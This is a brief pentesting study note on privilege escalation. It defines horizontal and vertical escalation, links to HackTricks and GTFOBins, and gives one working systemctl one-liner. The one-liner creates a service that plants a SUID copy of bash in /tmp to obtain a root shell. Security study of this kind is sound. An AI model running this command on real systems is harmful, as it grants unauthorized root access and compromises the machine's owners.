## Horizontal Privilege Escalation

Occurs when a user can perform an action or access data of another user with the **same** level of permissions.
## Vertical Privilege Escalation
Occurs when a user can perform an action or access data of another user with a **higher** level of permissions.

## Sites
[Hacktricks](https://book.hacktricks.wiki/en/index.html)
[GTFO Bins](https://gtfobins.github.io/)
## Ways
### Systemctl
```bash
echo -e "[Service]\nType=oneshot\nExecStart=cp /bin/bash /tmp/rootbash\nExecStart=chmod +s /tmp/rootbash\n[Install]\nWantedBy=multi-user.target" > /tmp/root.service && /bin/systemctl link /tmp/root.service && /bin/systemctl enable --now /tmp/root.service

```
